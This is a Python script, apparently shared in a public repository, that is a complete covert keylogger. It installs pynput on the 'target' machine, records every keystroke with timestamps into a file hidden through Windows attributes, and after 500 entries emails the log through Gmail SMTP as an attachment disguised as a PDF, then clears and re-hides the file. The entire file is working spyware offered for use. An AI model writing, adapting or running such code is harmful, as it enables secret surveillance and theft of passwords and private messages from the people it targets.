from pynput.keyboard import Listener
import subprocess
from datetime import datetime
#Making the target to download the library
args = ("pip install pynput")
sws=subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,shell=True).communicate()[0]
#creating a file which is invinsible by modifiying the attributes of the file
with open('hello.txt','a') as F:
    F.close()
    args = ("attrib +h hello.txt")
    sws=subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,shell=True).communicate()[0]
#function for sending the mail
def sendfile():
    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    mail_content = '''Hello,
    We have found that the target machine has pressed the following keys
    '''
    #The mail addresses and password
    sender_address =''
    sender_pass =''
    receiver_address =''
    #Setup the MIME
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'KeyLog'
    #The subject line
    #The body and the attachments for the mail
    message.attach(MIMEText(mail_content, 'plain'))
    attach_file_name = 'TP_python_prev.pdf'
    attach_file = open('hello.txt', 'rb') # Open the file as binary mode
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload) #encode the attachment
    #add payload header with filename
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)
    #Create SMTP session for sending the mail
    session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
    session.starttls() #enable security
    session.login(sender_address, sender_pass) #login with mail_id and password
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print('Mail Sent')
def on_press(key):
    #key pressed time
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    #writing it inside the file with a mode so that it would never overwrite 
    with open('hello.txt','a') as F:
        F.write(str(current_time)+' : '+str(key)+' is pressed'+'\n')
        F.close()
    with open('hello.txt','r') as File:
        s=File.read().split('\n')
        #if the keys pressed exceeds the amount send the mail and clear the file 
        if len(s)>=500:
            sendfile()
            args = ("attrib -h hello.txt")
            sws=subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,shell=True).communicate()[0]
            with open('hello.txt','w') as file:
                file.write('Start'+'\n')
                file.close()
            args = ("attrib +h hello.txt")
            sws=subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,shell=True).communicate()[0]
        else:
            pass
# This is the pynput listener which calls the op_press when key is pressed
with Listener(on_press=on_press) as listener:
    listener.join()
#Don't Forget to give me a star
